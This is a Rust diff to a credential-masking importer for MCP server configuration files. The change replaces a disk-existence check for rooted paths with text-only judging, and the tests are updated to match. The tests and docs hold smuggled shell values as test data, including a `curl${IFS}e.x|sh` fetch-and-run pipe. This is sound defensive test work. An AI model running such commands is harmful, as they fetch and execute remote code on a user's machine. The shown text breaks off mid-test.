@@ -63,27 +63,31 @@
 //!   field's value has its own fields masked too (`?next=…?api_key=…`), to
 //!   a depth of three, and one deeper is masked whole and refuses.
 //! - **Only a token is masked and imported:** ASCII letters and digits and
-//!   `-._~+=:@`, and `%` only in a server's own address's query or
+//!   `-._~+=:@/`, and `%` only in a server's own address's query or
 //!   fragment, where it is percent-encoding (`cmd /c` expands `%NAME%` in
-//!   an argument, an address in one included).
-//! - **A path is a place, and is shown,** when it holds only a token's
-//!   characters and path separators and either is relative (`./`, `../`,
-//!   `.\`, `..\`), or is rooted (`/`, a drive letter, `~/` or `~\`, `~`
-//!   being the home directory) and **names a file or directory that
-//!   exists**, which the reader asks by reading only its metadata (on
-//!   Windows that opens no file for reading), within a short time limit,
-//!   and only of a value under a credential's name ([`Places`],
-//!   [`OnDisk`]; the coordinator's answers to the final review and the
-//!   narrow check: a base64 secret begins with `/` one time in 64). A
-//!   value that begins with two separators (`//host/…`, `\\host\…`, after
-//!   `~` too) is never a place and never asked about: on Windows asking
-//!   would open a network share with the person's credentials. A value in
-//!   an address's query or fragment is never a place.
+//!   an argument, an address in one included). **`/` is a token's**, in an
+//!   argument and in an address's field alike (the coordinator's
+//!   settlement after the narrow check): a rooted path
+//!   (`/etc/ssl/client.key`), a `~/` path and a base64 secret with a `/`
+//!   (`/K7MDENG/bPxRfiCYzEXAMPLEKEY`) are masked and imported, which
+//!   [`ImportedServer::hidden`] says, never drawn and never refused. `\`
+//!   and every character a shell reads as more than a letter stay out.
+//! - **A relative path is a place, and is shown,** by its text alone: it
+//!   begins with `./`, `../`, `.\` or `..\` and holds only a token's
+//!   characters and `\` (`--key ./client.key`). A value in an address's
+//!   query or fragment is never a place.
+//! - **No value is asked of the disk.** Whether a value is a token, a
+//!   place or neither is judged by its text alone: only the file itself is
+//!   read. (A rooted path was a place for a while where it named a file
+//!   that existed; asking could reach the network, through an automounted
+//!   `/net/<host>`, an NFS mount or an SMB share, and hold the set-up's
+//!   worker, so the coordinator settled that it goes.)
 //! - **Anything else under such a name** (white space, a shell's
-//!   metacharacter, a path separator elsewhere or in a path that names
-//!   nothing: `x;curl…|sh`, a base64 key with a `/`) is masked and its
-//!   server refused ([`Refusal::NamedValue`]): it would be imported unseen,
-//!   and a credential that is not a token belongs in a variable.
+//!   metacharacter, a `\` outside a relative path: `x;curl…|sh`,
+//!   `C:\certs\k.pem`) is masked and its server refused
+//!   ([`Refusal::NamedValue`]): it would be imported unseen, and a
+//!   credential that is neither one token nor a relative path belongs in a
+//!   variable.
 //!
 //! The files read: `~/.claude.json`, Cursor's `~/.cursor/mcp.json` and
 //! Claude Desktop's file (`mcpServers`, each server a `command` with
@@ -215,13 +219,17 @@ fn names_a_secret(name: &str) -> bool {
 }
 
 /// Whether `character` can be in a token: an ASCII letter or digit, or one
-/// of `-._~+=:@`, and `%` only `in_address` (a query's or a fragment's
+/// of `-._~+=:@/`, and `%` only `in_address` (a query's or a fragment's
 /// value, where it is percent-encoding: `cmd /c` expands `%NAME%` in an
 /// argument, the final review). Nothing a shell reads as more than a
-/// letter.
+/// letter: `/` is a path's separator and a base64 secret's character (the
+/// coordinator's settlement after the narrow check), and `\` is not one.
 fn token_character(character: char, in_address: bool) -> bool {
     character.is_ascii_alphanumeric()
-        || matches!(character, '-' | '.' | '_' | '~' | '+' | '=' | ':' | '@')
+        || matches!(
+            character,
+            '-' | '.' | '_' | '~' | '+' | '=' | ':' | '@' | '/'
+        )
         || (in_address && character == '%')
 }
 
@@ -233,216 +241,17 @@ fn token_shaped(value: &str, in_address: bool) -> bool {
             .all(|character| token_character(character, in_address))
 }
 
-/// Where a path's place is to be asked for, when it is one: relative
-/// (`./`, `../`, `.\`, `..\`), a place as it is; or rooted (`/`, a drive
-/// letter, `~/`, `~\`), a place only where it names a file or directory
-/// that exists. `None` for a value that is not a path's shape: it holds
-/// more than a token's characters and path separators.
-fn path_form(value: &str) -> Option<PathForm> {
-    let shaped = value
-        .chars()
-        .all(|character| token_character(character, false) || matches!(character, '/' | '\\'));
-    // Two separators at its start, before or after `~` (`//host/…`,
-    // `~/\\host\…`): a network share's form on Windows, never a place,
-    // and never asked about (the narrow check).
-    if !shaped || doubled(value) || value.strip_prefix('~').is_some_and(doubled) {
-        return None;
-    }
-    let bytes = value.as_bytes();
-    let drive = bytes.len() >= 3
-        && bytes[0].is_ascii_alphabetic()
-        && bytes[1] == b':'
-        && matches!(bytes[2], b'/' | b'\\');
-    if ["./", "../", ".\\", "..\\"]
+/// Whether `value` is a relative path, by its text alone: it begins with
+/// `./`, `../`, `.\` or `..\` and holds only a token's characters and `\`.
+/// A place, and shown (the coordinator's answers); nothing asks the disk.
+fn relative_path(value: &str) -> bool {
+    ["./", "../", ".\\", "..\\"]
         .iter()
         .any(|start| value.starts_with(start))
-    {
-        Some(PathForm::Relative)
-    } else if drive
-        || ["/", "~/", "~\\"]
-            .iter()
-            .any(|start| value.starts_with(start))
-    {
-        Some(PathForm::Rooted)
-    } else {
-        None
-    }
+        && value
+            .chars()
+            .all(|character| token_character(character, false) || character == '\\')
 }
-
-/// Whether `text` begins with two path separators.
-fn doubled(text: &str) -> bool {
-    let mut characters = text.chars();
-    matches!(
-        (characters.next(), characters.next()),
-        (Some('/' | '\\'), Some('/' | '\\'))
-    )
-}
-
-/// A path's form ([`path_form`]).
-#[derive(Debug, Clone, Copy, PartialEq, Eq)]
-enum PathForm {
-    /// `./`, `../`, `.\`, `..\`: a place as it is.
-    Relative,
-    /// `/`, a drive letter, `~/`, `~\`: a place where it exists.
-    Rooted,
-}
-
-/// What the reader asks of the disk: whether a rooted path, the value of a
-/// credential's name, names a file or directory that exists, by reading
-/// only its metadata (on Windows that opens no file for reading; the
-/// coordinator's answers to the final review and the narrow check). The
-/// program gives [`OnDisk`]; a test gives one of its own, or [`NOWHERE`].
-pub trait Places {
-    /// Whether `path` (`/…`, `C:\…`, `~/…`, `~\…`, as it is written)
-    /// names a file or directory that exists.
-    fn exists(&self, path: &str) -> bool;
-}
-
-/// What answers whether a local path exists: `std::fs::metadata`, or a
-/// test's own.
-pub type Stat = std::sync::Arc<dyn Fn(&Path) -> bool + Send + Sync>;
-
-/// The disk, `~` the home directory. **Each answer is bounded** (the
-/// coordinator, after the narrow check): the metadata is asked on a thread
-/// of its own and waited for at most [`OnDisk::LIMIT`]; a path that does
-/// not answer in time (an automounted `/net/<host>`, a hung NFS or FUSE
-/// mount) is not a place, the thread left to end when its call returns or
-/// the program does, and **the rest of the file's reading asks nothing
-/// more**, so that one slow mount costs one limit and one thread. A thread
-/// that cannot be started gives no place either. **Never asked about:** a
-/// path that begins with two separators, before or after `~` is expanded,
-/// or whose first component is a Windows prefix other than a drive letter
-/// (a share, `\\?\`, `\\.\`): on Windows its metadata would open a
-/// session with the share's host, with the person's credentials.
-pub struct OnDisk {
-    home: Option<std::path::PathBuf>,
-    limit: std::time::Duration,
-    stat: Stat,
-    /// A path did not answer in time: nothing more is asked.
-    given_up: std::cell::Cell<bool>,
-    /// How many paths were put to `stat`, for the tests.
-    asked: std::cell::Cell<usize>,
-}
-
-impl std::fmt::Debug for OnDisk {
-    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        f.debug_struct("OnDisk")
-            .field("home", &self.home)
-            .field("limit", &self.limit)
-            .field("given_up", &self.given_up.get())
-            .field("asked", &self.asked.get())
-            .finish_non_exhaustive()
-    }
-}
-
-impl OnDisk {
-    /// How long a path's metadata is waited for.
-    pub const LIMIT: std::time::Duration = std::time::Duration::from_millis(200);
-
-    /// The disk, `~` being `home`, asked with `std::fs::metadata` within
-    /// [`OnDisk::LIMIT`].
-    #[must_use]
-    pub fn new(home: Option<std::path::PathBuf>) -> Self {
-        Self::with_stat(
-            home,
-            Self::LIMIT,
-            std::sync::Arc::new(|path: &Path| std::fs::metadata(path).is_ok()),
-        )
-    }
-
-    /// The disk asked with `stat` within `limit`: for a test, which holds
-    /// its stat at a gate, with no real waiting.
-    #[must_use]
-    pub fn with_stat(
-        home: Option<std::path::PathBuf>,
-        limit: std::time::Duration,
-        stat: Stat,
-    ) -> Self {
-        Self {
-            home,
-            limit,
-            stat,
-            given_up: std::cell::Cell::new(false),
-            asked: std::cell::Cell::new(0),
-        }
-    }
-
-    /// The local path asked about for `path`, `~` expanded; `None` for one
-    /// never asked about: two separators at its start, before or after the
-    /// expansion; a Windows prefix other than a drive letter; or `~` with
-    /// no home.
-    fn local_path(&self, path: &str) -> Option<std::path::PathBuf> {
-        if doubled(path) {
-            return None;
-        }
-        let real = match path.strip_prefix("~/").or_else(|| path.strip_prefix("~\\")) {
-            Some(rest) if rest.starts_with(['/', '\\']) => return None,
-            Some(rest) => self.home.as_ref()?.join(rest),
-            None => std::path::PathBuf::from(path),
-        };
-        if doubled(&real.to_string_lossy()) {
-            return None;
-        }
-        match real.components().next() {
-            Some(std::path::Component::Prefix(prefix))
-                if !matches!(prefix.kind(), std::path::Prefix::Disk(_)) =>
-            {
-                None
-            }
-            _ => Some(real),
-        }
-    }
-}
-
-impl Places for OnDisk {
-    fn exists(&self, path: &str) -> bool {
-        // A path of this file did not answer in time: nothing more is asked.
-        if self.given_up.get() {
-            return false;
-        }
-        // A share, a device, or `~` with no home: never asked about.
-        let Some(real) = self.local_path(path) else {
-            return false;
-        };
-        self.asked.set(self.asked.get() + 1);
-        // The metadata on a thread of its own, so that a mount that does not
-        // answer holds that thread and not the worker. Its answer goes to
-        // nobody once the wait below has given up, and the thread ends when
-        // the call returns, or with the program.
-        let (answer, answered) = std::sync::mpsc::channel();
-        let stat = std::sync::Arc::clone(&self.stat);
-        let started = std::thread::Builder::new()
-            .name("cineris-place".to_owned())
-            .spawn(move || {
-                let _ = answer.send(stat(&real));
-            });
-        if started.is_err() {
-            return false;
-        }
-        match answered.recv_timeout(self.limit) {
-            Ok(exists) => exists,
-            // No answer in time (or the stat panicked): no place, and no
-            // more questions for this file.
-            Err(_) => {
-                self.given_up.set(true);
-                false
-            }
-        }
-    }
-}
-
-/// No path names a place: for text with no disk behind it.
-#[derive(Debug, Clone, Copy)]
-pub struct Nowhere;
-
-impl Places for Nowhere {
-    fn exists(&self, _path: &str) -> bool {
-        false
-    }
-}
-
-/// [`Nowhere`], to hand the reader.
-pub const NOWHERE: Nowhere = Nowhere;
 
 /// How a value whose name says it is a credential is shown.
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -451,28 +260,21 @@ enum Masked {
     No,
     /// Masked, and imported as it is: a token.
     Token,
-    /// Masked, and its server refused: neither a token nor a place.
+    /// Masked, and its server refused: neither one token nor a relative
+    /// path.
     Loose,
 }
 
 impl Masked {
     /// What an argument's `value` under a name that says it is a
-    /// credential is: a token, a place (a relative path, or one of
-    /// `places`, the rooted paths found to exist as the file was read), or
-    /// neither; nothing, and the mask itself (masked already by the
-    /// formats), are shown as they are.
-    fn of(value: &str, places: &[String]) -> Self {
-        if value.is_empty() || value == cineris_base::redact::MASK {
+    /// credential is, by its text alone: a relative path, a token, or
+    /// neither. Nothing, the mask itself (masked already by the formats)
+    /// and a relative path, a place, are shown as they are.
+    fn of(value: &str) -> Self {
+        if value.is_empty() || value == cineris_base::redact::MASK || relative_path(value) {
             Self::No
         } else if token_shaped(value, false) {
             Self::Token
-        } else if match path_form(value) {
-            Some(PathForm::Relative) => true,
-            Some(PathForm::Rooted) => places.iter().any(|place| place == value),
-            None => false,
-        } {
-            // A place, shown (the coordinator's answers).
-            Self::No
         } else {
             Self::Loose
         }
@@ -656,12 +458,14 @@ pub enum Refusal {
     Unseen,
     /// Its name cannot be a setting's: empty, or longer than [`MAX_NAME`].
     Name,
-    /// A value whose name says it is a credential is neither a token nor a
-    /// place (it holds white space, a shell's metacharacter, or a path
-    /// separator where no path that exists is): it would be imported unseen,
-    /// and belongs in a variable (since the review of the fixes of step
-    /// 25's third pull request). An address inside a field's value deeper
-    /// than is looked into is refused as one too.
+    /// A value whose name says it is a credential is neither one token nor
+    /// a relative path (it holds white space, a shell's metacharacter, or a
+    /// `\` outside a relative path, as in `C:\certs\k.pem`): it would be
+    /// imported unseen, and belongs in a variable (since the review of the
+    /// fixes of step 25's third pull request; judged by its text alone,
+    /// since the coordinator's settlement after the narrow check). An
+    /// address inside a field's value deeper than is looked into is refused
+    /// as one too.
     NamedValue,
     /// It is neither a command nor an address this version reads.
     NotUnderstood,
@@ -681,10 +485,6 @@ pub struct ImportedServer {
     pub headers: Vec<String>,
     /// Why it cannot be imported, if it cannot.
     pub refused: Option<Refusal>,
-    /// Its arguments' rooted paths that name a file or directory that
-    /// exists, found by their metadata as the file was read ([`Places`]):
-    /// under a credential's name, each is a place, and shown.
-    pub places: Vec<String>,
 }
 
 impl ImportedServer {
@@ -723,13 +523,12 @@ impl ImportedServer {
     }
 
     fn view(&self) -> (String, Masked) {
-        launch_view(&self.launch, &self.places)
+        launch_view(&self.launch)
     }
 }
 
-/// `launch` as it is shown, and what of it is masked by a name; `places`
-/// are its rooted paths that exist.
-fn launch_view(launch: &Launch, places: &[String]) -> (String, Masked) {
+/// `launch` as it is shown, and what of it is masked by a name.
+fn launch_view(launch: &Launch) -> (String, Masked) {
     let mask = cineris_base::redact::MASK;
     match launch {
         Launch::Command { program, args } => {
@@ -738,31 +537,30 @@ fn launch_view(launch: &Launch, places: &[String]) -> (String, Masked) {
             // The value after a flag whose name says it is a credential.
             let mut after_flag = false;
             for arg in args {
-                let shown =
-                    if after_flag && !arg.starts_with('-') && Masked::of(arg, places) != Masked::No
-                    {
-                        hidden = hidden.and(Masked::of(arg, places));
-                        mask.to_owned()
-                    } else if let Some((name, value)) = arg.split_once('=')
+                let shown = if after_flag && !arg.starts_with('-') && Masked::of(arg) != Masked::No
+                {
+                    hidden = hidden.and(Masked::of(arg));
+                    mask.to_owned()
+                } else if let Some((name, value)) = arg.split_once('=')
                         // An address's first `=` is in its query or fragment,
                         // whose fields are masked below, not before a name.
                         && !name.contains("://")
                         && names_a_secret(name)
-                        && Masked::of(value, places) != Masked::No
-                    {
-                        hidden = hidden.and(Masked::of(value, places));
-                        format!("{name}={mask}")
-                    } else if arg.contains("://") {
-                        // An address (`--auth-url https://…`): its host and path
-                        // shown, and a credential in its query masked, as in a
-                        // server's own address; its user part was masked as it
-                        // was read.
-                        let (shown, masked) = masked_query(arg, false, 0);
-                        hidden = hidden.and(masked);
-                        shown
-                    } else {
-                        arg.clone()
-                    };
+                        && Masked::of(value) != Masked::No
+                {
+                    hidden = hidden.and(Masked::of(value));
+                    format!("{name}={mask}")
+                } else if arg.contains("://") {
+                    // An address (`--auth-url https://…`): its host and path
+                    // shown, and a credential in its query masked, as in a
+                    // server's own address; its user part was masked as it
+                    // was read.
+                    let (shown, masked) = masked_query(arg, false, 0);
+                    hidden = hidden.and(masked);
+                    shown
+                } else {
+                    arg.clone()
+                };
                 after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg);
                 parts.push(quoted(&shown));
             }
@@ -787,23 +585,19 @@ pub enum ImportError {
 }
 
 /// The servers of another client's file at `path`, read whole, values
-/// dropped and masked as the [module documentation](self) says, `places`
-/// telling which rooted paths exist. A file ending in `.toml` is Codex's,
-/// and any other JSON.
+/// dropped and masked as the [module documentation](self) says. Only the
+/// file is read: no value of it is asked of the disk. A file ending in
+/// `.toml` is Codex's, and any other JSON.
 ///
 /// # Errors
 ///
 /// [`ImportError`] when it cannot be read or is not understood.
-pub fn read_servers(path: &Path, places: &dyn Places) -> Result<Vec<ImportedServer>, ImportError> {
-    read_servers_within(path, MAX_FILE, places)
+pub fn read_servers(path: &Path) -> Result<Vec<ImportedServer>, ImportError> {
+    read_servers_within(path, MAX_FILE)
 }
 
 /// [`read_servers`] with `limit` in [`MAX_FILE`]'s place, for its test.
-fn read_servers_within(
-    path: &Path,
-    limit: u64,
-    places: &dyn Places,
-) -> Result<Vec<ImportedServer>, ImportError> {
+fn read_servers_within(path: &Path, limit: u64) -> Result<Vec<ImportedServer>, ImportError> {
     let file =
         std::fs::File::open(path).map_err(|error| ImportError::Unreadable(error.to_string()))?;
     let mut text = String::new();
@@ -816,29 +610,16 @@ fn read_servers_within(
     let toml = path
         .extension()
         .is_some_and(|extension| extension.eq_ignore_ascii_case("toml"));
-    servers_at(&text, toml, places)
+    servers_in(&text, toml)
 }
 
 /// The servers of a file's `text`: TOML (`[mcp_servers.<name>]`) or JSON
-/// (`mcpServers`), with no rooted path taken for a place ([`NOWHERE`]).
+/// (`mcpServers`).
 ///
 /// # Errors
 ///
 /// [`ImportError::NotUnderstood`] when it is neither.
 pub fn servers_in(text: &str, toml: bool) -> Result<Vec<ImportedServer>, ImportError> {
-    servers_at(text, toml, &NOWHERE)
-}
-
-/// [`servers_in`], `places` telling which rooted paths exist.
-///
-/// # Errors
-///
-/// [`ImportError::NotUnderstood`] when it is neither.
-pub fn servers_at(
-    text: &str,
-    toml: bool,
-    places: &dyn Places,
-) -> Result<Vec<ImportedServer>, ImportError> {
     let text = text.strip_prefix('\u{feff}').unwrap_or(text);
     let value: serde_json::Value = if toml {
         let table: toml::Table = text.parse().map_err(|error: toml::de::Error| {
@@ -867,16 +648,11 @@ pub fn servers_at(
     Ok(servers
         .iter()
         .take(MAX_SERVERS)
-        .map(|(name, entry)| server(&filter, places, name, entry))
+        .map(|(name, entry)| server(&filter, name, entry))
         .collect())
 }
 
-fn server(
-    filter: &SecretFilter,
-    places: &dyn Places,
-    name: &str,
-    entry: &serde_json::Value,
-) -> ImportedServer {
+fn server(filter: &SecretFilter, name: &str, entry: &serde_json::Value) -> ImportedServer {
     let text = |key: &str| entry.get(key).and_then(serde_json::Value::as_str);
     let names = |key: &str| -> Vec<String> {
         entry
@@ -927,41 +703,14 @@ fn server(
             env,
             headers,
             refused: Some(Refusal::NotUnderstood),
-            places: Vec::new(),
         };
     };
-    // The rooted paths that name a file or directory that exists, asked
-    // here, as the file is read, on the set-up's worker, and only of the
-    // values `launch_view` judges by their name: after a credential's
-    // flag, or of a credential's `NAME=value` (the narrow check: every
-    // rooted argument was asked about).
-    let mut found = Vec::new();
-    if let Launch::Command { args, .. } = &launch {
-        let mut after_flag = false;
-        for arg in args {
-            let judged = if after_flag && !arg.starts_with('-') {
-                Some(arg.as_str())
-            } else {
-                arg.split_once('=')
-                    .filter(|(name, _)| !name.contains("://") && names_a_secret(name))
-                    .map(|(_, value)| value)
-            };
-            if let Some(value) = judged
-                && path_form(value) == Some(PathForm::Rooted)
-                && places.exists(value)
-            {
-                found.push(value.to_owned());
-            }
-            after_flag = arg.starts_with('-') && !arg.contains('=') && names_a_secret(arg);
-        }
-    }
     let mut server = ImportedServer {
         name: name.to_owned(),
         launch,
         env,
         headers,
         refused: None,
-        places: found,
     };
     let unseen = |text: &str| text.chars().any(cineris_base::acts_unseen);
     let names_unseen = server
@@ -979,7 +728,7 @@ fn server(
         Some(Refusal::Name)
     } else if masked {
         Some(Refusal::HoldsCredential)
-    } else if launch_view(&server.launch, &server.places).1 == Masked::Loose {
+    } else if launch_view(&server.launch).1 == Masked::Loose {
         Some(Refusal::NamedValue)
     } else {
         None
@@ -1139,9 +888,10 @@ mod tests {
     /// pull request, the coordinator's decision): a credential's words, as
     /// whole words of the name; never a name that ends in a command, a
     /// hook, a script, a file or a path, nor a switch turned off. A token
-    /// under such a name is masked and imported, which `hidden` says; a
-    /// value under one that is not a token is masked and refuses its
-    /// server.
+    /// under such a name is masked and imported, which `hidden` says, an
+    /// address's `token=a/b` among them since `/` is a token's (the
+    /// coordinator's settlement after the narrow check); a value under one
+    /// that is not a token is masked and refuses its server.
     #[test]
     fn only_a_token_under_a_credentials_name_is_hidden_and_any_other_value_refuses() {
         let servers = servers_in(
@@ -1180,7 +930,14 @@ mod tests {
         );
         assert!(real.hidden(), "the row says a value is imported unseen");
         assert_eq!(real.refused, None, "a token is imported as it is");
-        for name in ["phrase", "pathed", "query"] {
+        let query = by_name(&servers, "query");
+        assert_eq!(
+            query.shown(),
+            format!("https://x.example.com/mcp?token={MASK}")
+        );
+        assert!(query.hidden());
+        assert_eq!(query.refused, None, "a `/` is a token's");
+        for name in ["phrase", "pathed"] {
             let server = by_name(&servers, name);
             assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
             assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
@@ -1194,11 +951,13 @@ mod tests {
         assert_eq!(words("v2Token.x"), ["v2", "token", "x"]);
     }
 
-    /// A token is ASCII letters and digits and `-._~+=:@`, and nothing a
+    /// A token is ASCII letters and digits and `-._~+=:@/`, and nothing a
     /// shell reads as more: a script after a credential's name refuses its
     /// server, however few its spaces; and a `NAME=value` whose name holds
     /// white space is part of a script, and shown (the short review of the
-    /// fixes, Medium 1, settled by the coordinator).
+    /// fixes, Medium 1, settled by the coordinator). A base64 key with a
+    /// `/` is a token, masked and imported (the coordinator's settlement
+    /// after the narrow check).
     #[test]
     fn a_script_is_not_a_token_and_a_name_with_white_space_is_not_one() {
         let servers = servers_in(
@@ -1221,11 +980,16 @@ mod tests {
         assert_eq!(sh.shown(), r#"sh -c "mcp --key=abc;curl${IFS}e.x|sh""#);
         assert!(!sh.hidden());
         assert_eq!(sh.refused, None, "the whole script is shown");
-        for name in ["dotted", "base64"] {
-            let server = by_name(&servers, name);
-            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
-            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
-        }
+        let dotted = by_name(&servers, "dotted");
+        assert_eq!(dotted.refused, Some(Refusal::NamedValue));
+        assert_eq!(dotted.shown(), format!("db-mcp --key {MASK}"));
+        let base64 = by_name(&servers, "base64");
+        assert_eq!(
+            base64.shown(),
+            format!("aws-mcp --secret-access-key {MASK}")
+        );
+        assert_eq!(base64.refused, None);
+        assert!(base64.hidden());
         let marks = by_name(&servers, "marks");
         assert_eq!(marks.shown(), format!("db-mcp --api-key {MASK}"));
         assert_eq!(marks.refused, None);
@@ -1354,169 +1118,114 @@ mod tests {
         }
     }
 
-    /// A rooted path under a credential's name is a place only where it
-    /// names a file or directory that exists, asked of its metadata, `~`
-    /// the home directory; otherwise it is a secret: a base64 key that
-    /// begins with `/`, a path that names nothing, refuse their servers. A
-    /// value in an address's query is never a place, though it exist (the
-    /// coordinator's answer to the final review).
+    /// Under a credential's name `/` is a token's, in an argument and in an
+    /// address's field alike: a base64 secret with a `/`, a rooted path and
+    /// a `~/` path are masked and imported, the row saying a value is
+    /// imported unseen, never drawn and never refused; a shell's character
+    /// and a `\` refuse, the row saying to move the value into a variable;
+    /// a relative path is shown, by its text alone (the coordinator's
+    /// settlement after the narrow check, in place of the existence rule).
     #[test]
-    fn a_rooted_path_is_a_place_only_where_it_exists() {
-        let scratch = cineris_testkit::Scratch::outside("cineris-config-unit", "import_places");
-        let key = scratch.file("keys/client.key", "not read");
-        // A file of its own for the `NAME=value` forms, so that each is
-        // asked about apart from the flag's (the narrow check).
-        let named = scratch.file("keys/named.key", "not read");
-        let named = named.to_str().unwrap().to_owned();
-        let home = scratch.dir("home");
-        std::fs::create_dir_all(home.join(".ssh")).unwrap();
-        std::fs::write(home.join(".ssh").join("id_ed25519"), "not read").unwrap();
-        std::fs::write(home.join("k"), "not read").unwrap();
-        let key = key.to_str().unwrap().to_owned();
-        assert_eq!(
-            path_form(&key),
-            Some(PathForm::Rooted),
-            "the scratch folder's path is a plain one: {key}"
-        );
-        let places = OnDisk::new(Some(home));
-        let text = serde_json::json!({"mcpServers": {
-            "real": {"command": "tls-mcp", "args": ["--key", key, "--ssh-key", "~/.ssh/id_ed25519",
-                "--other-key", "~\\k", format!("--key={named}"), format!("KEY={named}")]},
-            "aws": {"command": "aws-mcp", "args": ["--secret-access-key", "/K7MDENG/bPxRfiCYzEXAMPLEKEY"]},
-            "gone": {"command": "tls-mcp", "args": ["--ssh-key", "~/.ssh/missing"]},
-            "script": {"command": "tls-mcp", "args": ["--key", "/nowhere/k;sh"]},
-            "query": {"url": format!("https://x.example.com/mcp?token={key}")}
-        }})
-        .to_string();
-        let servers = servers_at(&text, false, &places).unwrap();
-        let real = by_name(&servers, "real");
-        assert_eq!(
-            real.shown(),
-            format!(
-                "tls-mcp --key {key} --ssh-key ~/.ssh/id_ed25519 --other-key ~\\k --key={named} \
-                 KEY={named}"
-            )
-        );
-        assert_eq!(real.refused, None);
-        assert!(!real.hidden());
-        for name in ["aws", "gone", "script", "query"] {
-            let server = by_name(&servers, name);
-            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
-            assert!(server.shown().contains(MASK), "{name}: {}", server.shown());
-        }
-        assert!(!by_name(&servers, "aws").shown().contains("K7MDENG"));
-        // With nothing found on the disk, none of them is a place.
-        let unfound = servers_in(&text, false).unwrap();
-        assert_eq!(by_name(&unfound, "real").refused, Some(Refusal::NamedValue));
-    }
-
-    /// What the disk is asked about: only a rooted value under a
-    /// credential's name, never a non-credential argument, and never a
-    /// value that begins with two separators, before or after `~` (a share
-    /// on Windows, which its metadata would open with the person's
-    /// credentials; the narrow check).
-    #[test]
-    fn the_disk_is_asked_only_about_a_credentials_rooted_value_and_never_a_share() {
-        struct Asked(std::cell::RefCell<Vec<String>>);
-        impl Places for Asked {
-            fn exists(&self, path: &str) -> bool {
-                self.0.borrow_mut().push(path.to_owned());
-                true
-            }
-        }
-        let asked = Asked(std::cell::RefCell::default());
-        let servers = servers_at(
-            r#"{"mcpServers": {"x": {"command": "x-mcp", "args": [
-                "--key", "//host/share/k", "--key", "/\\host\\share", "--ssh-key", "~/\\\\host\\share",
-                "--other-key", "~//host/k", "--root", "/etc/x", "/srv/y", "ROOT=/etc/r",
-                "--key", "/etc/k", "KEY=/etc/v"]}}}"#,
+    fn a_slash_is_a_tokens_and_a_rooted_path_is_masked_and_imported() {
+        let servers = servers_in(
+            r#"{"mcpServers": {
+                "aws": {"command": "aws-mcp", "args": ["--secret-access-key", "/K7MDENG/bPxRfiCYzEXAMPLEKEY"]},
+                "tls": {"command": "tls-mcp", "args": ["--key", "/etc/ssl/client.key",
+                    "--ssh-key", "~/.ssh/id_ed25519", "--key=/etc/ssl/k2", "TLS_KEY=/etc/ssl/k3"]},
+                "script": {"command": "tls-mcp", "args": ["--key", "/x;sh"]},
+                "windows": {"command": "tls-mcp", "args": ["--key", "C:\\certs\\k.pem"]},
+                "relative": {"command": "tls-mcp", "args": ["--key", "./client.key"]},
+                "query": {"url": "https://x.example.com/mcp?token=a/b"}
+            }}"#,
             false,
-            &asked,
         )
         .unwrap();
-        assert_eq!(*asked.0.borrow(), ["/etc/k", "/etc/v"]);
+        let aws = by_name(&servers, "aws");
+        assert_eq!(aws.shown(), format!("aws-mcp --secret-access-key {MASK}"));
+        let tls = by_name(&servers, "tls");
         assert_eq!(
-            servers[0].refused,
-            Some(Refusal::NamedValue),
-            "a share is no place"
+            tls.shown(),
+            format!("tls-mcp --key {MASK} --ssh-key {MASK} --key={MASK} TLS_KEY={MASK}")
         );
-    }
-
-    /// The program's disk never asks about a share, a Windows prefix other
-    /// than a drive letter, or a `~` with no home (the narrow check).
-    #[test]
-    fn the_programs_disk_never_asks_about_a_share_or_a_home_it_has_not() {
-        let home = std::path::PathBuf::from("home");
-        let disk = OnDisk::new(Some(home.clone()));
-        for never in [
-            "//host/share/k",
-            "/\\host\\share",
-            "\\\\host\\share",
-            "\\/host",
-            "~/\\\\host\\share",
-            "~//host/k",
-            "~\\\\host",
-        ] {
-            assert_eq!(disk.local_path(never), None, "{never}");
+        let query = by_name(&servers, "query");
+        assert_eq!(
+            query.shown(),
+            format!("https://x.example.com/mcp?token={MASK}")
+        );
+        for server in [aws, tls, query] {
+            assert_eq!(server.refused, None, "{}: imported as it is", server.name);
+            assert!(server.hidden(), "{}: the row says so", server.name);
         }
-        assert_eq!(disk.local_path("~/k"), Some(home.join("k")));
-        assert_eq!(
-            disk.local_path("/etc/k"),
-            Some(std::path::PathBuf::from("/etc/k"))
-        );
-        let homeless = OnDisk::new(None);
-        assert_eq!(homeless.local_path("~/k"), None);
-        assert!(!homeless.exists("~/k"));
-        // A home on a share is not asked about either.
-        let shared = OnDisk::new(Some(std::path::PathBuf::from("\\\\server\\home")));
-        assert_eq!(shared.local_path("~/k"), None);
+        for name in ["script", "windows"] {
+            let server = by_name(&servers, name);
+            assert_eq!(server.shown(), format!("tls-mcp --key {MASK}"), "{name}");
+            assert_eq!(server.refused, Some(Refusal::NamedValue), "{name}");
+        }
+        let relative = by_name(&servers, "relative");
+        assert_eq!(relative.shown(), "tls-mcp --key ./client.key");
+        assert!(!relative.hidden());
+        assert_eq!(relative.refused, None);
     }
 
-    /// The disk's answer is waited for at most its limit: a stat that does
-    /// not answer in time is not a place, and the rest of that file asks
-    /// nothing more; one that answers at once is a place. A gate held by the
-    /// test stands in for a hung mount, with no real waiting: the limit is
-    /// zero, and the gate opens when the test drops it (the coordinator,
-    /// after the narrow check).
+    /// No value is asked of the disk: a file and a directory the test makes,
+    /// and paths that name nothing, are judged alike under `--key`,
+    /// `--key=`, `KEY=` and an address's `?api_key=`, each masked and
+    /// imported (the coordinator's settlement after the narrow check: the
+    /// existence rule reached the network through automounted and shared
+    /// paths). The judging takes text alone; a break that asks the disk
+    /// again tells the two apart.
     #[test]
-    fn a_disk_that_does_not_answer_in_time_gives_no_place_and_is_asked_nothing_more() {
-        use std::sync::{Arc, Mutex, mpsc};
-        let text = r#"{"mcpServers": {"x": {"command": "x-mcp",
-            "args": ["--key", "/etc/k", "--ssh-key", "/etc/s"]}}}"#;
-        let (gate, held) = mpsc::channel::<()>();
-        let held = Mutex::new(held);
-        let stat: Stat = Arc::new(move |_: &Path| {
-            // Blocks until the test drops the gate.
-            let _ = held
-                .lock()
